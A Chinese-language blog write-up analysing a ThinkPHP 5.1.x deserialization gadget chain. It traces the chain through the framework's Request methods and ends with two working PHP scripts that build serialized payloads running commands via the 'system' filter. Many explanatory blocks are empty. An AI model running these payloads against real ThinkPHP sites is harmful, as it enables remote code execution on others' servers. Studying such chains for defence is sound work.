# 原创
：  ThinkPHP5.1.x 反序列化

# ThinkPHP5.1.x 反序列化

#### ThinkPHP5.1.x 反序列化

## 补充知识

### PHP反序列化原理

> 



### 在PHP反序列化的过程中会自动执行一些魔术方法

<th align="center">方法名</th><th align="center">调用条件</th>
|------
<td align="center">__call</td><td align="center">调用不可访问或不存在的方法时被调用</td>
<td align="center">__callStatic</td><td align="center">调用不可访问或不存在的静态方法时被调用</td>
<td align="center">__clone</td><td align="center">进行对象clone时被调用，用来调整对象的克隆行为</td>
<td align="center">__constuct</td><td align="center">构建对象的时被调用</td>
<td align="center">__debuginfo</td><td align="center">当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</td>
<td align="center">__destruct</td><td align="center">明确销毁对象或脚本结束时被调用</td>
<td align="center">__get</td><td align="center">读取不可访问或不存在属性时被调用</td>
<td align="center">__invoke</td><td align="center">当以函数方式调用对象时被调用</td>
<td align="center">__isset</td><td align="center">对不可访问或不存在的属性调用isset()或empty()时被调用</td>
<td align="center">__set</td><td align="center">当给不可访问或不存在属性赋值时被调用</td>
<td align="center">__set_state</td><td align="center">当调用var_export()导出类时,此静态方法被调用,用__set_state的返回值做为var_export的返回值</td>
<td align="center">__sleep</td><td align="center">当使用serialize时被调用,当你不需要保存大对象的所有数据时很有用</td>
<td align="center">__toString</td><td align="center">当一个类被转换成字符串时被调用</td>
<td align="center">__unset</td><td align="center">对不可访问或不存在的属性进行unset时被调用</td>
<td align="center">__wakeup</td><td align="center">当使用unserialize时被调用,可用于做些对象的初始化操作</td>

### 反序列化的常见起点

> 



### 反序列化的常见中间跳板

> 



### 反序列化的常见终点

> 



### Phar反序列化原理以及特征

> 



```
copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,
fileinode,filemtime,fileowner,fileperms,
fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,
is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,
imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,
get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo

```

## 漏洞环境

> 



## 漏洞分析

### 寻找反序列化的起始点

> 



> 



### 寻找反序列化的中间跳板

> 



> 



> 



### 寻找反序列化代码执行点

> 



```
该类中没有”visible”方法
实现了__call方法

```

> 



```
public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {
            // 获取原始数据
            return $data;
        }

        $name = (string) $name;
        if ('' != $name) {
            // 解析name
            if (strpos($name, '/')) {
                list($name, $type) = explode('/', $name);
            }

            $data = $this-&gt;getData($data, $name);

            if (is_null($data)) {
                return $default;
            }

            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this-&gt;getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            if (version_compare(PHP_VERSION, '7.1.0', '&lt;')) {
                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
                $this-&gt;arrayReset($data);
            }
        } else {
            $this-&gt;filterValue($data, $name, $filter);
        }

        if (isset($type) &amp;&amp; $data !== $default) {
            // 强制类型转换
            $this-&gt;typeCast($data, $type);
        }

        return $data;
    }

```

> 



```
public function param($name = '', $default = null, $filter = '')
    {
        if (!$this-&gt;mergeParam) {
            $method = $this-&gt;method(true);

            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this-&gt;post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this-&gt;put(false);
                    break;
                default:
                    $vars = [];
            }

            // 当前请求参数和URL地址中的参数合并
            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));

            $this-&gt;mergeParam = true;
        }

        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this-&gt;file();
            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;

            return $this-&gt;input($data, '', $default, $filter);
        }

        return $this-&gt;input($this-&gt;param, $name, $default, $filter);
    }

```

> 



```
public function isAjax($ajax = false)
    {
        $value  = $this-&gt;server('HTTP_X_REQUESTED_WITH');
        $result = 'xmlhttprequest' == strtolower($value) ? true : false;

        if (true === $ajax) {
            return $result;
        }

        $result           = $this-&gt;param($this-&gt;config['var_ajax']) ? true : $result;
        $this-&gt;mergeParam = false;
        return $result;
    }

```

```
public function isPjax($pjax = false)
    {
        $result = !is_null($this-&gt;server('HTTP_X_PJAX')) ? true : false;

        if (true === $pjax) {
            return $result;
        }

        $result           = $this-&gt;param($this-&gt;config['var_pjax']) ? true : $result;
        $this-&gt;mergeParam = false;
        return $result;
    }

```

### 构造反序列化利用链

> 



> 



```
&lt;?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this-&gt;data = ['H3rmesk1t' =&gt; new Request()];
        $this-&gt;append = ['H3rmesk1t' =&gt; []];
    }
}
class Request{
    protected $filter;
    protected $hook = [];
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       =&gt; '_method',
        // 表单ajax伪装变量
        'var_ajax'         =&gt; '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         =&gt; '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     =&gt; 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   =&gt; '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  =&gt; '',
        // HTTPS代理标识
        'https_agent_name' =&gt; '',
        // IP代理获取标识
        'http_agent_ip'    =&gt; 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  =&gt; 'html',
    ];
    function __construct(){
        $this-&gt;filter = "system";
        $this-&gt;config = ['var_ajax' =&gt; ''];
        $this-&gt;hook = ['visible' =&gt; [$this,'isAjax']];
    }
}
namespace think\process\pipes;
use think\model\Pivot;

class Windows{
    private $files = [];
    public function __construct(){
        $this-&gt;files = [new Pivot()];
    }
}

namespace think\model;
use think\Model;

class Pivot extends Model{
}

use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?&gt;

```

> 



```
&lt;?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this-&gt;data = ['H3rmesk1t' =&gt; new Request()];
        $this-&gt;append = ['H3rmesk1t' =&gt; []];
    }
}
class Request{
    protected $filter;
    protected $hook = [];
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       =&gt; '_method',
        // 表单ajax伪装变量
        'var_ajax'         =&gt; '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         =&gt; '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     =&gt; 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   =&gt; '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  =&gt; '',
        // HTTPS代理标识
        'https_agent_name' =&gt; '',
        // IP代理获取标识
        'http_agent_ip'    =&gt; 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  =&gt; 'html',
    ];
    function __construct(){
        $this-&gt;filter = "system";
        $this-&gt;config = ['var_pjax' =&gt; ''];
        $this-&gt;hook = ['visible' =&gt; [$this,'isPjax']];
    }
}
namespace think\process\pipes;
use think\model\Pivot;

class Windows{
    private $files = [];
    public function __construct(){
        $this-&gt;files = [new Pivot()];
    }
}

namespace think\model;
use think\Model;

class Pivot extends Model{
}

use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?&gt;

```

### 漏洞利用条件

> 

- 未经过滤直接使用反序列化操作- 可以文件上传且文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤

